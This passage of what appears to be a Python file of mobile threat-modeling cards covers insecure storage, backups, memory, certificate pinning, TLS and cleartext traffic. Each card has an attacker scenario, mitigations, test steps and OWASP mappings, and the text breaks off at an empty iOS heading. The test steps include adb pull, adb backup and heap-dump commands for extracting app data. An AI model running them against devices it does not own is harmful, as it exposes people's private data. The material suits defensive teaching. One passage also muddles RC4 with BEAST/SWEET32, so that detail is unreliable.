Ricardo powers on the found device. It boots straight to the home screen — no PIN, no biometric. He opens the banking app. It opens without authentication (because the device has no lock). He opens ADB and pulls `com.banking.app/databases/`. He now has the SQLite database with transaction history and a locally cached session token that has not expired. The app had no requirement for a device PIN. The device had none. The data was not further protected.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data stored by the app is accessible to whoever possesses the physical device, because the app does not enforce minimum device security requirements and does not apply additional data-level encryption independent of device authentication.

### What can go wrong?

- Locally stored sensitive data (transaction history, session tokens, PII) is readable from a device without a lock screen.
- USB debugging enabled on a user device allows direct file system access via ADB.
- Decommissioned or stolen devices with no factory reset leak data to new owners.

### What are we going to do about it?

- Require a device lock screen (PIN, pattern, or biometric) as a prerequisite for app use; refuse to function without one, or at least refuse to cache sensitive data.
- Use `KeyguardManager.isDeviceSecure()` to check for a lock screen; present a warning and limit functionality if absent.
- On Android, use keys with `setUserAuthenticationRequired(true)` so data encrypted by those keys is not accessible without a lock screen credential.
- Encrypt all sensitive data at rest with keys bound to device authentication, in addition to relying on OS-level file encryption.
- Do not leave USB debugging enabled in production; include this in release checklists.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `KeyguardManager.isDeviceSecure()` returns `true` if the device has a secure lock screen; gate sensitive features on this check.
- `DevicePolicyManager`: enterprise deployments can enforce screen-lock timeout and minimum password complexity.
- File-based encryption (FBE, default since Android 7): user data in the `DE` (Device Encrypted) storage is protected by the lock screen credential; use `CE` (Credential Encrypted) storage for sensitive app files.
- USB debugging: not controllable by the app directly, but document in the threat model; enterprise MDM can disable it.

**iOS**
- `UIDevice.current.isPasscodeSet` (via LocalAuthentication `LAContext.canEvaluatePolicy`) — check whether a passcode is set.
- iOS enforces data protection classes on files; use `NSFileProtectionCompleteUntilFirstUserAuthentication` or `NSFileProtectionComplete` for sensitive files. `NSFileProtectionNone` should never be used for sensitive data.
- `UIFileSharingEnabled = false` in `Info.plist` — prevents iTunes/Finder file sharing.

**Testing**
- Remove the device PIN and verify the app detects the absence of a screen lock and restricts access to sensitive data.
- Connect a device without ADB authorization prompt (USB debugging on, no lock) and attempt `adb pull /data/data/com.target.app/`; verify the data is inaccessible without device unlock.

**OWASP Mappings**
- MASVS: RESILIENCE-1, STORAGE-1
- MASTG: TEST-0012, TEST-0246, TEST-0247, TEST-0248, TEST-0249
- MASWE: MASWE-0008
"""
}

CARDS["network-&-storage/NS5"] = {
"explanation": """\
## Scenario: Kevin can read sensitive data mapped to user accounts or sessions by extracting data exposed through third-party libraries, notifications, backups, caches, local databases, or other embedded services

Consider a scenario where Kevin installs a popular social app and investigates what it stores locally. He finds the app's embedded SQLite database contains a table populated by the analytics SDK, which logs every screen the user visited along with the user ID. He also finds a notification payload cached by the push service SDK that contains the user's full name and a session token. Neither the app developer nor the user intended for this data to be stored locally in this form.

1. Third-party SDKs write data to local storage on the developer's behalf, often without the developer's knowledge of exactly what is stored.
2. Push notification payloads are cached by the notification SDK and may persist after the notification is dismissed.
3. App-level backups (Android Auto Backup, iTunes backup) can include SDK-generated data files that the developer did not intend to back up.

### Example

Kevin uses ADB backup on a non-encrypted device to extract the app's data. He finds `analytics.db` — created by the bundled analytics SDK — which contains a full browsing history of the user's in-app navigation, device fingerprint data, and a persistent user ID linking sessions across time. The app's own privacy policy says it does not track browsing history. The analytics SDK's privacy policy, buried in the developer's data-processing agreement, says something different. Kevin now has a detailed profile of the user's behaviour.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Third-party libraries and platform services create additional data stores that may contain sensitive data the app developer did not intend to persist or expose, expanding the disclosure surface beyond what is visible in the app's own code.

### What can go wrong?

- Analytics SDKs collect more data than expected and write it to local storage.
- Push notification payloads containing PII or tokens are cached by the notification SDK.
- Auto-backup includes SDK-generated databases containing sensitive data.
- Notification content visible on the lock screen or in the notification shade exposes sensitive information without the user unlocking the device.

### What are we going to do about it?

- Audit every third-party SDK for its local storage footprint; review its data retention and what it writes to disk.
- Configure push notification payloads to not include PII or sensitive content in the notification body; use a notification ID that the app resolves to content only after authentication.
- Configure Android Auto Backup exclusion rules to exclude SDK-generated databases containing sensitive data.
- Use `Notification.Builder.setVisibility(Notification.VISIBILITY_SECRET)` or `.VISIBILITY_PRIVATE` for notifications containing sensitive content.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Enumerate all databases and files in `getFilesDir()`, `getCacheDir()`, and `getExternalFilesDir()` after SDK initialisation to identify unexpected storage.
- Configure `android:allowBackup="false"` or use `<backup-rules>` / `<cloud-backup-rules>` to exclude sensitive SDK-generated files from Auto Backup.
- `NotificationCompat.Builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)` hides notification content on the lock screen.
- Set notification channel importance to prevent cached payloads from persisting; review push SDK documentation for payload caching behaviour.

**iOS**
- Review what third-party SDKs write to the Documents, Library/Application Support, Library/Caches, and tmp directories.
- Sensitive data in Library/Application Support is included in iTunes/Finder backups by default; exclude specific files using `URLResourceKey.isExcludedFromBackupKey`.
- Use `UNNotificationContent` without PII in push payloads; deliver sensitive content via a Notification Service Extension that enriches the notification only after the device is unlocked.
- Notification Centre caches notification payloads; review the push payload for PII.

**Testing**
- Use MobSF's dynamic analysis to enumerate all files created by the app (including SDKs) during a test session.
- Capture a `adb backup` or iTunes backup and inspect all files for unexpected sensitive data.
- Review each third-party SDK's privacy documentation and data-processing agreement.

**OWASP Mappings**
- MASVS: PLATFORM-3, STORAGE-2
- MASTG: TEST-0004, TEST-0005, TEST-0054, TEST-0315
- MASWE: MASWE-0054
"""
}

CARDS["network-&-storage/NS6"] = {
"explanation": """\
## Scenario: Sam can dump sensitive data from memory because the data is not stored as primitive data types and overwritten with random data after use, or because the app's input fields use insecure SDKs to store data in RAM

Consider a scenario where Sam has a memory-forensics tool and briefly gains access to a device where a healthcare app is running. He attaches the tool and dumps the app's heap. He finds patient names, medication lists, and a decrypted session token — all as `String` objects in memory, never cleared after use. Java/Swift `String` objects are immutable and garbage-collected non-deterministically, meaning sensitive values may persist in RAM long after the developer believes they have been discarded.

1. Immutable `String` objects in Java and Swift/Objective-C cannot be securely zeroed; the value remains in the heap until GC collects and overwrites it.
2. Memory dumps from crash reports (including Firebase Crashlytics) can inadvertently include heap contents containing sensitive values.
3. Android's `EditText.getText()` returns a `CharSequence`; if the underlying implementation holds the value in a `String`, it cannot be zeroed securely.

### Example

Sam obtains a brief window of physical access to the unlocked device. He dumps the app's memory using a forensics tool and searches for patterns matching credit card numbers. He finds three — all still in the heap from a payment session that ended 20 minutes earlier. The app's code had set the reference to `null`, but the garbage collector had not yet overwritten the heap region. The developer believed the data was gone. The heap disagreed.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data persists in volatile memory beyond its intended lifetime due to immutable string types and non-deterministic garbage collection, making it accessible to memory forensics, crash dumps, and processes with memory access on rooted devices.

### What can go wrong?

- Credentials, tokens, and PII remain in heap memory long after they are semantically "deleted."
- Crash reports capture heap snapshots containing sensitive in-flight data.
- Rooted devices allow other processes to read the target app's memory.

### What are we going to do about it?

- Use mutable byte arrays (`byte[]`, `char[]`) for sensitive data; overwrite them with zeros when done, then set the reference to `null`.
- Avoid storing sensitive values in `String` objects; use `char[]` for passwords and zero them immediately after use.
- Configure crash reporting SDKs to scrub or not include heap dumps; review the SDK's documentation for data-minimization options.
- Minimize the lifetime of sensitive values in memory; process and discard as quickly as possible.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android (Java/Kotlin)**
- Use `char[]` instead of `String` for passwords and sensitive text; zero with `Arrays.fill(array, '\\0')` immediately after use.
- `SecretKeySpec`: clear key material with `key.destroy()` (where supported by the provider).
- Pin entry via `EditText`: extract characters immediately, copy to a `char[]`, clear the `EditText`, and process the `char[]`.
- Avoid `String.format()` or string concatenation with sensitive values; the intermediate strings are not controllable.

**iOS (Swift/Objective-C)**
- Swift `String` is a value type backed by a heap buffer; use `Data` or `UnsafeMutableRawPointer` for sensitive buffers and zero with `data.resetBytes(in: 0..<data.count)`.
- `SecureEnclave`-backed key operations: the key material never leaves the Enclave; only the result of cryptographic operations is in application memory.
- `LAContext` credentials: zero any `String` passed as a `localizedReason` after the prompt returns.

**Testing**
- After a payment or login session, capture a heap dump (`adb shell am dumpheap <pid> dump.hprof`) and search for sensitive patterns.
- Use a memory scanning tool (e.g., Volatility with an Android profile) on a forensics image.
- Review crash report configurations to verify heap dumps or full memory snapshots are not included.

**OWASP Mappings**
- MASVS: STORAGE-2
- MASTG: TEST-0011, TEST-0060
- MASWE: (see MASVS references above)
"""
}

CARDS["network-&-storage/NS7"] = {
"explanation": """\
## Scenario: Steve can access sensitive data by reading backups and/or local, internal, or external storage

Consider a scenario where Steve connects a device to his computer and takes an unencrypted ADB backup. The app developer had left `android:allowBackup="true"` in the manifest without configuring backup exclusions. Steve extracts the backup archive and finds the app's SQLite database containing account details, a preferences file with a stored session token, and a private key file in the app's files directory. The OS-level backup mechanism transferred everything faithfully.

1. `android:allowBackup="true"` (the default) allows `adb backup` to include all app data without device unlock on older Android versions.
2. Files written to external storage (`Environment.getExternalStorageDirectory()`) are world-readable and included in backups by default.
3. iTunes/Finder backups on iOS include app data by default unless files are marked with `isExcludedFromBackupKey`.
4. Cloud backups (Google Drive, iCloud) transmit local app data to remote storage, broadening the attack surface.

### Example

Steve buys a second-hand Android device. The seller did not perform a factory reset. Steve runs `adb backup -noapk com.target.app` — which works on Android versions below 12 without device unlock. He finds the banking app's database in the backup, containing the previous owner's full transaction history and a stored authentication token. The token is still valid because the previous owner had not explicitly logged out. Steve logs in using the token. The data migration to the new owner was complete, if unintentional.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Backup mechanisms — designed to help users preserve their data — inadvertently copy sensitive app data to locations accessible to attackers with device access, backup clients, or cloud storage access.

### What can go wrong?

- ADB backup extracts all app data from a device without requiring device unlock (on older Android versions).
- Cloud backups store sensitive data on servers that the user may not intend to share.
- Files on external storage are accessible by any app with `READ_EXTERNAL_STORAGE` permission and are included in device backups.
- Decommissioned devices with unwiped data expose the previous user's sensitive information.

### What are we going to do about it?

- Set `android:allowBackup="false"` for apps handling highly sensitive data; or configure detailed `<data-extraction-rules>` to exclude sensitive files and databases.
- Never store sensitive data on external storage; use internal storage with appropriate data-protection classes.
- On iOS, mark sensitive files as excluded from backup: `try url.setResourceValues(URLResourceValues(isExcludedFromBackup: true))`.
- Encrypt all sensitive data at rest with keys that are not included in backups.
- Implement server-side session invalidation to handle stolen devices; do not rely on local logout.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `android:allowBackup="false"` in `<application>`: prevents all `adb backup` extraction.
- `res/xml/data_extraction_rules.xml` (Android 12+) and `res/xml/backup_rules.xml` (older): configure `<exclude>` rules for sensitive databases and preference files.
- Never write sensitive data to `getExternalStorageDirectory()` or any path under `Environment.DIRECTORY_*`; use `getFilesDir()` or `getCacheDir()`.
- Use `FileInputStream` with a key from the KeyStore to encrypt files stored locally.

**iOS**
- Mark files as excluded from iCloud/iTunes backup:
  ```swift
  var values = URLResourceValues(); values.isExcludedFromBackup = true; try url.setResourceValues(values)
  ```
- Use `NSFileProtectionComplete` for sensitive files: encrypted until first unlock; inaccessible while locked.
- Keychain items with `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` are not included in backups (not extractable from backup).

**Testing**
- Run `adb backup -apk -shared com.target.app` and inspect the resulting `.ab` file for sensitive data.
- On iOS, capture an iTunes backup and use iMazing or similar tools to inspect app data.
- Check `android:allowBackup` in the merged manifest and verify the backup exclusion rules cover all sensitive files.

**OWASP Mappings**
- MASVS: AUTH-1, CRYPTO-2, PRIVACY-1, STORAGE-1, STORAGE-2
- MASTG: TEST-0001, TEST-0003, TEST-0009, TEST-0052, TEST-0053, TEST-0058, TEST-0072, TEST-0079, TEST-0200, TEST-0201, TEST-0202, TEST-0207, TEST-0215, TEST-0216, TEST-0262, TEST-0287, TEST-0298, TEST-0299, TEST-0300, TEST-0301, TEST-0302, TEST-0303, TEST-0304, TEST-0305, TEST-0306, TEST-0388
- MASWE: MASWE-0002, MASWE-0003, MASWE-0004, MASWE-0006, MASWE-0007, MASWE-0036
"""
}

CARDS["network-&-storage/NS8"] = {
"explanation": """\
## Scenario: Martin can modify or expose sensitive data through unsafe reflection when reading data from public data storage because the data is not validated before being read by the app

Consider a scenario where Martin discovers the app reads a configuration class name from a `SharedPreferences` entry and instantiates it using Java reflection: `Class.forName(className).newInstance()`. Martin modifies `SharedPreferences` on a rooted device to substitute a class name of his choosing. The app instantiates Martin's class, which executes arbitrary code in the app's process context.

1. Reflection with class names from untrusted sources allows an attacker to instantiate arbitrary classes.
2. Untrusted data read from public storage and used to control application behaviour (e.g., feature flags, config values) is a manipulation surface.

### Example

Martin modifies the app's `SharedPreferences` XML on a rooted device to change `config_class=com.target.app.DefaultConfig` to `config_class=com.target.app.debug.AdminConfig`. The `AdminConfig` class is present in the APK (it was never removed from the release build) and has a static initializer that grants admin privileges. The app reads the value from storage and instantiates the class via reflection. Martin now has admin access. The developer left debug code in the release build and trusted local storage as a configuration source without validation.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Elevation of Privilege**.

Martin manipulates data in public or device-accessible storage that the app trusts without validation, causing the app to execute unintended code or apply incorrect configuration — effectively allowing him to alter the app's behaviour to his advantage.

### What can go wrong?

- Reflection on attacker-controlled class names allows arbitrary code execution.
- Configuration data from accessible storage can be modified to change app behaviour, disable security controls, or activate hidden features.
- Object deserialization gadget chains can be triggered by substituting class names or serialized object values.

### What are we going to do about it?

- Never use data from untrusted or publicly accessible storage to control reflection, class loading, or deserialization.
- Validate all data read from `SharedPreferences`, external storage, or other accessible locations before use; apply strict allowlists.
- Remove debug and development classes from release builds so that they cannot be instantiated even if an attacker controls the class name.
- If configuration must be loaded from a file, sign the configuration and verify the signature before applying it.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Audit all `Class.forName()`, `ClassLoader.loadClass()`, and `Intent.setClassName()` calls; verify the class name is not derived from `SharedPreferences`, extras, or external storage.
- Remove debug classes from release builds using ProGuard rules or product flavors.
- Validate all values read from `SharedPreferences` and external storage with strict type and value checks before use.
- If configuration files must be used, compute and verify an HMAC over the file content before applying it.

**iOS**
- `NSClassFromString()` with untrusted input is dangerous; restrict usage to compile-time constants.
- `NSKeyedUnarchiver` with `requiresSecureCoding = false` is a deserialization risk; use `requiresSecureCoding = true` and an `NSSecureCoding` allowlist.
- Validate all values read from `UserDefaults` with strict type assertions before use.

**Testing**
- On a rooted device, modify `SharedPreferences` / `UserDefaults` values to unexpected class names and observe app behaviour.
- Static analysis: grep for `Class.forName`, `ClassLoader.loadClass`, `NSClassFromString` with variable arguments.
- Review all data read from shared preferences and external storage that influences control flow.

**OWASP Mappings**
- MASVS: CODE-4, STORAGE-1
- MASTG: TEST-0002
- MASWE: MASWE-0082
"""
}

CARDS["network-&-storage/NS9"] = {
"explanation": """\
## Scenario: Adrian can compromise the app communication through a proxy because the app does not use certificate pinning or implements it incorrectly

Consider a scenario where Adrian sets up Burp Suite as an intercepting proxy and installs the Burp CA certificate into the device's user certificate store. The app trusts all certificates in the device's user store. Adrian now intercepts, reads, and modifies every API call the app makes, including authentication requests containing credentials. There is no certificate pinning. The server's TLS certificate is valid. The connection is "secure" in the usual sense — just not from Adrian.

1. TLS without certificate pinning protects against passive interception by third parties, but not against an attacker who can install a trusted CA certificate.
2. Incorrect certificate pinning (pinning the wrong certificate, not checking the full chain, pinning only in debug builds) provides the appearance of pinning without the protection.
3. Public-key pinning with insufficient backup pins causes outages during certificate rotation.

### Example

Adrian installs a testing CA into the Android user trust store. For Android 7+, apps that do not opt in to trusting user certificates via a Network Security Config (`<certificates src="user" />`) will not trust his CA — but the app has not set `cleartextTrafficPermitted="false"` and does include `<certificates src="user" />` in the debug config that was accidentally shipped in the release build. Adrian intercepts the app's login request and reads the credentials in the proxy. The production release trusted his debug CA.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Tampering**.

Without certificate pinning, any party who can insert a trusted CA into the device's trust store (the device owner, an MDM, a malicious profile) can perform a man-in-the-middle attack, reading and modifying all TLS-protected communication.

### What can go wrong?

- Authentication credentials are captured and replayed.
- API responses are modified to grant additional access or inject malicious content.
- Sensitive PII transmitted over the network is intercepted.
- Debug Network Security Config settings shipped in release builds inadvertently trust user-installed CAs.

### What are we going to do about it?

- Implement certificate pinning using the server's public key or certificate hash; pin at least two pins (primary + backup) to avoid outage during rotation.
- Use `network_security_config.xml` on Android with `<pin-set>` configured for all pinned domains.
- On iOS, implement pinning in `URLSession` delegate `urlSession(_:didReceive:completionHandler:)` or use a library with a documented pinning implementation.
- Ensure the Network Security Config does not allow `user` certificate trust in release builds; review debug and release config separately.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `network_security_config.xml`:
  ```xml
  <domain-config cleartextTrafficPermitted="false">
    <domain includeSubdomains="true">api.example.com</domain>
    <pin-set expiration="2026-01-01">
      <pin digest="SHA-256">primaryHash=</pin>
      <pin digest="SHA-256">backupHash=</pin>
    </pin-set>
  </domain-config>
  ```
- Verify the release build references the production config, not the debug config.
- OkHttp: use `CertificatePinner` to add per-domain pins programmatically.

**iOS**
- Implement `URLSessionDelegate.urlSession(_:didReceive:completionHandler:)` and validate the server certificate against stored public-key hashes.
- TrustKit: a popular iOS/macOS library for certificate pinning with backup-pin support.
- App Transport Security (ATS): ensure `NSAllowsArbitraryLoads` is `false` in production builds.

**Rotation Planning**
- Always pin at least two keys: the current leaf/CA and a backup (the next CA or a pre-generated backup key).
- Set a certificate expiry date in the pin-set and use a push-update mechanism to rotate pins before expiry.

**Testing**
- Install Burp Suite CA in the user store and verify the app rejects the connection (Android 7+ default, or with pinning).
- Test on Android with a custom user CA; verify `SSLPeerUnverifiedException` is thrown and the connection is rejected.
- Verify the app handles pin validation failure gracefully (error message, no crash, no fallback to unpinned connection).

**OWASP Mappings**
- MASVS: NETWORK-2
- MASTG: TEST-0022, TEST-0068, TEST-0242, TEST-0243, TEST-0244, TEST-0385
- MASWE: MASWE-0047
"""
}

CARDS["network-&-storage/NSX"] = {
"explanation": """\
## Scenario: Maarten can compromise the communication between the app and external services because the app does not verify TLS certificates and chains, trusts insecure sources, lacks hostname verification, or ignores TLS verification issues

Consider a scenario where Maarten is on the same Wi-Fi network as a user of the target app. He performs an ARP spoofing attack to position himself as a man-in-the-middle and presents a self-signed certificate. The app has `X509TrustManager` implemented with empty `checkClientTrusted` and `checkServerTrusted` methods — the classic trust-everything implementation copied from Stack Overflow. Every API call is now transparently proxied through Maarten's machine.

1. Custom `X509TrustManager` implementations that accept all certificates bypass TLS validation entirely.
2. `hostnameVerifier` set to return `true` unconditionally bypasses hostname verification.
3. Setting `CURLOPT_SSL_VERIFYPEER=0` or equivalent in native code disables certificate verification.

### Example

Maarten finds the app was written by a developer who encountered a TLS error in development and "fixed" it by implementing `TrustAllCerts`. The code shipped to production. Maarten presents any self-signed certificate for any hostname. The app connects. He reads and modifies all API traffic, including the authentication endpoint. He intercepts the user's credentials on the first login. The TLS connection was established successfully. No errors were raised. The security indicator in the app showed a lock icon.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Tampering**.

Disabling TLS certificate or hostname verification eliminates the authentication property of TLS, allowing any party who can intercept the network connection to read and modify all traffic.

### What can go wrong?

- Credentials, session tokens, and all sensitive API traffic are intercepted.
- API responses are modified to inject malicious content or grant additional access.
- The user and the app have no indication the connection is being intercepted.

### What are we going to do about it?

- Never implement `X509TrustManager` with empty check methods; use the default system trust manager.
- Never set `HostnameVerifier` to `ALLOW_ALL_HOSTNAME_VERIFIER` or a lambda that returns `true`.
- Use linting rules or static analysis (Android Lint rule `TrustAllX509TrustManager`) to flag insecure TLS configurations at build time.
- Test TLS configuration with a proxy; verify the app rejects self-signed certificates and certificates for incorrect hostnames.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Lint rule: `TrustAllX509TrustManager` and `AllowAllHostnameVerifier` are flagged by Android Lint; enable in CI.
- Use `OkHttpClient.Builder().build()` without a custom `SSLSocketFactory`; the default uses the system trust store.
- `Network Security Config`: set `cleartextTrafficPermitted="false"` and do not include `<certificates src="user"/>` in release builds.
- Static analysis: grep for `TrustAllX509TrustManager`, `ALLOW_ALL_HOSTNAME_VERIFIER`, `setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)`.

**iOS**
- `NSURLSessionDelegate.urlSession(_:didReceive:completionHandler:)`: call `.useCredential` only if the certificate chain is valid; call `.cancelAuthenticationChallenge` on failure.
- ATS enforcement: `NSAllowsArbitraryLoads = false`; document and justify any `NSExceptionDomains`.
- Static analysis: grep for `credential.trust` without certificate validation, `SecTrustEvaluate` called without checking the result.

**Testing**
- Use mitmproxy or Burp Suite with a custom CA; verify the app refuses connection.
- Test with an expired certificate; verify the app refuses connection.
- Test with a certificate for the wrong hostname; verify the app refuses connection.

**OWASP Mappings**
- MASVS: NETWORK-1
- MASTG: TEST-0019, TEST-0021, TEST-0023, TEST-0065, TEST-0067, TEST-0234, TEST-0282, TEST-0283, TEST-0284, TEST-0285, TEST-0286, TEST-0295, TEST-0396, TEST-0397
- MASWE: MASWE-0052
"""
}

CARDS["network-&-storage/NSJ"] = {
"explanation": """\
## Scenario: Nihel can compromise the communication as it may fall back to an insecure or unencrypted channel, because encryption is optional, or because of client-server protocol or security-provider weaknesses

Consider a scenario where Nihel controls a network appliance between a user and the target app's server. The app negotiates TLS but accepts a downgrade to TLS 1.0 because the server still supports it for "legacy compatibility." Nihel performs a POODLE-style downgrade attack, forcing the connection to TLS 1.0 and exploiting its known weaknesses. The connection was "encrypted" — with a cipher suite that was deprecated in 2015.

1. Apps that accept TLS 1.0 or TLS 1.1 expose users to known protocol downgrade attacks.
2. Apps that allow plaintext fallback (`cleartext traffic permitted`) allow network-level interception on standard Wi-Fi networks.
3. Android security provider vulnerabilities (older versions of Conscrypt/OpenSSL bundled with the app) can be exploited by an on-path attacker.

### Example

Nihel observes the app negotiates `TLS_RSA_WITH_RC4_128_SHA` when connecting to the server — an export-grade cipher that is years past its retirement date. She performs a BEAST/SWEET32 attack against the RC4 session, eventually recovering the session token. The developer's comment in the code reads "// TODO: remove RC4 fallback after server upgrade." The server upgrade was seventeen months ago.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

A downgraded or weak TLS connection provides weaker or no confidentiality guarantees, allowing an on-path attacker to eavesdrop on or modify the communication.

### What can go wrong?

- Protocol downgrade allows exploitation of known weaknesses in older TLS versions or cipher suites.
- Cleartext fallback allows passive interception on any network the user connects to.
- Outdated Android security providers have known cryptographic vulnerabilities.
- HTTP APIs used as a fallback transmit credentials and tokens in cleartext.

### What are we going to do about it?

- Configure the app and server to require TLS 1.2 as a minimum; prefer TLS 1.3.
- Disable all weak cipher suites: no RC4, no 3DES, no export ciphers, no null encryption.
- Set `cleartextTrafficPermitted="false"` in `network_security_config.xml`.
- Keep the Android security provider up to date by calling `ProviderInstaller.installIfNeeded()` at app startup to use the latest Conscrypt from Google Play Services.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `network_security_config.xml`: `<base-config cleartextTrafficPermitted="false">` globally disables HTTP.
- OkHttp: configure `ConnectionSpec` to restrict to `ConnectionSpec.MODERN_TLS` (TLS 1.2+, modern cipher suites).
- `ProviderInstaller.installIfNeeded(context)`: updates the security provider at runtime to use the latest version from Google Play Services. Call in `Application.onCreate()`.
- Verify server-supported TLS versions and cipher suites using `testssl.sh` or `ssllabs.com`.

**iOS**
- ATS enforces TLS 1.2+ by default; do not disable ATS (`NSAllowsArbitraryLoads`) in production.
- ATS uses forward-secret cipher suites by default; review `NSExceptionDomains` for any sites with weakened TLS requirements.
- `URLSessionConfiguration.tlsMinimumSupportedProtocolVersion = .TLSv12` as an explicit floor (iOS 13+).

**Testing**
- Use `testssl.sh` against the app's API endpoints to verify no TLS 1.0/1.1 or weak ciphers are accepted.
- Use a proxy to attempt downgrade negotiation to TLS 1.0; verify the app refuses the connection.
- Verify `cleartext traffic permitted="false"` is set and that HTTP URLs are rejected at the network layer.

**OWASP Mappings**
- MASVS: CODE-3, NETWORK-1
- MASTG: TEST-0020, TEST-0023, TEST-0066
- MASWE: MASWE-0048, MASWE-0049, MASWE-0051
"""
}

CARDS["network-&-storage/NSQ"] = {
"explanation": """\
## Scenario: Ahmed can read and modify data in transit because the communication is transmitted over an unencrypted channel

Consider a scenario where Ahmed is sitting in a café operating a rogue access point. The target app makes some API calls over HTTPS but a subset of older API endpoints still use HTTP — a legacy from when the API was first launched. Ahmed intercepts the HTTP requests, reads the session token in the `Authorization` header, and replays it against the HTTPS endpoints. The session token was transmitted in cleartext over HTTP. One unencrypted request is all it takes.

1. HTTP transmits all content in cleartext; anyone who can observe the network can read and modify it.
2. A single HTTP request carrying a session token or credentials compromises the session even if all other requests use HTTPS.
3. Mixed-content scenarios: an app that starts with HTTPS but follows an HTTP redirect or loads resources over HTTP is partially exposed.

### Example

Ahmed's rogue access point logs all traffic. He filters for HTTP requests from mobile apps. He sees `GET http://api.target.com/profile` with `Authorization: ****** He uses the token to make authenticated HTTPS requests to the same API. He now has full account access. The developer had marked the `/profile` endpoint as "low-risk" because it only read data. The session token, once captured, gave access to everything else.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Tampering**.

Cleartext HTTP communication allows passive interception (disclosure) and active modification (tampering) of all data in transit, including authentication credentials that enable further attacks.

### What can go wrong?

- Credentials and session tokens transmitted over HTTP are captured and replayed.
- API responses are modified by an on-path attacker to inject malicious content.
- Users on untrusted networks (public Wi-Fi, mobile hotspots) are exposed to interception without any indication.

### What are we going to do about it?

- Migrate all API endpoints to HTTPS; there are no legitimate exceptions for endpoints that carry authentication credentials.
- Set `cleartextTrafficPermitted="false"` on Android and enforce ATS on iOS.
- Implement HTTP Strict Transport Security (HSTS) on the server to prevent protocol downgrade even if a client does not enforce HTTPS.
- Audit all URLs in the app's source code for `http://` scheme references.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `android:usesCleartextTraffic="false"` in `<application>` (or managed via `network_security_config.xml`): blocks all cleartext HTTP traffic.
- Lint: `GetHTTPResource` rule flags `http://` URLs in code; enable in CI.
- Review all hardcoded and dynamically constructed URLs in the source for `http://` scheme usage.
- OkHttp: `OkHttpClient.Builder().protocols(listOf(Protocol.HTTP_2, Protocol.HTTP_1_1))` — both work only over TLS; add `.connectionSpecs(listOf(ConnectionSpec.MODERN_TLS))`.

**iOS**
- ATS: `NSAllowsArbitraryLoads = false` blocks HTTP by default.
- `NSExceptionDomains` entries with `NSExceptionAllowsInsecureHTTPLoads = true` are exceptions that must be documented and justified.
- Audit all URL strings in the code for `http://` patterns.

**Server-Side**
- `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` header on all HTTPS responses.
- Redirect all HTTP requests to HTTPS with a 301 permanent redirect; do not serve API responses over HTTP.

**Testing**
- Proxy all traffic and filter for HTTP requests; verify no app-generated requests use HTTP.
- Use `nmap --script http-methods` to verify the server does not respond to HTTP for sensitive paths.

**OWASP Mappings**
- MASVS: AUTH-1, NETWORK-1
- MASTG: TEST-0019, TEST-0020, TEST-0065, TEST-0066, TEST-0067, TEST-0217, TEST-0218, TEST-0233, TEST-0235, TEST-0236, TEST-0237, TEST-0238, TEST-0239, TEST-0321, TEST-0322, TEST-0323, TEST-0342, TEST-0343, TEST-0344, TEST-0345, TEST-0348
- MASWE: MASWE-0037, MASWE-0050
"""
}

CARDS["network-&-storage/NSK"] = {
"explanation": """\
## Scenario: Taher can intercept, extract, or modify sensitive data at rest or in transit by influencing or altering methods for transferring or storing data

Consider a scenario where Taher has compromised the app's data-transfer pipeline. The app stores encrypted data locally and periodically syncs it to a cloud service. Taher has found that the app's sync library can be replaced at runtime via a reflection-based plugin system — the plugin is loaded from a directory that is writable on a rooted device. He substitutes a plugin that silently exfiltrates all synced data before encryption. The encryption was correctly implemented. The data was exfiltrated before it reached the encryption layer.

1. Substituting a lower-level library or service used for data transfer allows interception before encryption or after decryption.
2. Writable directories used for plugin or library loading are a code-injection surface on rooted/jailbroken devices.
3. Sync and backup pipelines that handle data differently from the main app may apply weaker security controls.

### Example

Taher identifies that the app's analytics sync module is loaded from a path in the app's external storage directory, which is writable. He replaces the module binary with a version that logs all data passed to `encrypt()` before the encryption call. On the next sync, all plaintext data is logged to a file he controls. The encryption was AES-256-GCM. The pre-encryption hook was not anticipated. "We encrypt everything" was technically true. It was also technically circumvented.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Information Disclosure**.

By altering the methods responsible for data transfer or storage, Taher subverts the security controls that depend on those methods, intercepting data before protection is applied or after it is removed.

### What can go wrong?

- Pre-encryption hooks capture plaintext data before it is protected.
- Post-decryption hooks capture plaintext data after it is decrypted for use.
- Modified transfer functions exfiltrate data to attacker-controlled servers in addition to the legitimate destination.
- Plugin or library loading from writable directories allows runtime code injection.

### What are we going to do about it?

- Never load code or plugins from writable or user-accessible directories in production builds.
- Verify the integrity of all loaded modules using cryptographic signatures before use.
- Apply runtime integrity checks to detect hooking of critical data-handling functions.
- Keep encryption as close to the data source as possible, within a tamper-resistant execution context.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Do not load code from external storage (`Environment.getExternalStorageDirectory()`), world-writable directories, or any path not under `getFilesDir()` in production.
- Use `DexClassLoader` only with classes loaded from the APK itself or from a verified, signed source.
- Detect library injection: compare loaded `.so` paths in `/proc/self/maps` against expected app paths.

**iOS**
